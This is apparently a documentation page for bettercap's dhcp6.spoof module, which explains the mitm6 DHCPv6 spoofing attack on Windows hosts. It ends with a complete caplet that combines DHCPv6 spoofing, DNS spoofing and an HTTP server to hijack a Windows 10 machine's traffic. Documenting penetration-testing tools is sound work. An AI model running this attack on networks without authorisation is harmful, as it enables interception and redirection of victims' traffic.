---
title: "dhcp6.spoof"
date: 2019-02-25T13:02:36+01:00
draft: false
weight: 3
---

This module's purpose is attacking Microsoft Windows hosts by replying to DHCPv6 messages and providing the target with a link-local 
IPv6 address and setting the attacker host as default DNS server (as described [here](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)).

{{% notice info %}}
This module must be used together with [dns.spoof](https://github.com/bettercap/bettercap/wiki/dns.spoof) module in order to be effective.
{{% /notice %}}

### Commands

#### `dhcp6.spoof on`

Start the DHCPv6 spoofer in the background.
#### `dhcp6.spoof off`

Stop the DHCPv6 spoofer in the background.

### Parameters

| parameter | default | description |
|-----------|---------|-------------|
| `dhcp6.spoof.domains` | `microsoft.com, goole.com, facebook.com, apple.com, twitter.com` | Comma separated values of domain names to spoof. | 

### Examples

The following is the [mitm6.cap](https://github.com/bettercap/caplets/blob/master/mitm6.cap) caplet performing the full DHCPv6 attack versus a Windows 10 machine which is booting:

```sh
# let's spoof Microsoft and Google ^_^
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# every http request to the spoofed hosts will come to us
# let's give em some contents
set http.server.path /var/www/something

# serve files
http.server on
# redirect DNS request by spoofing DHCPv6 packets
dhcp6.spoof on
# send spoofed DNS replies ^_^
dns.spoof on

# set a custom prompt for ipv6
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
# clear the events buffer and the screen
events.clear
clear
```
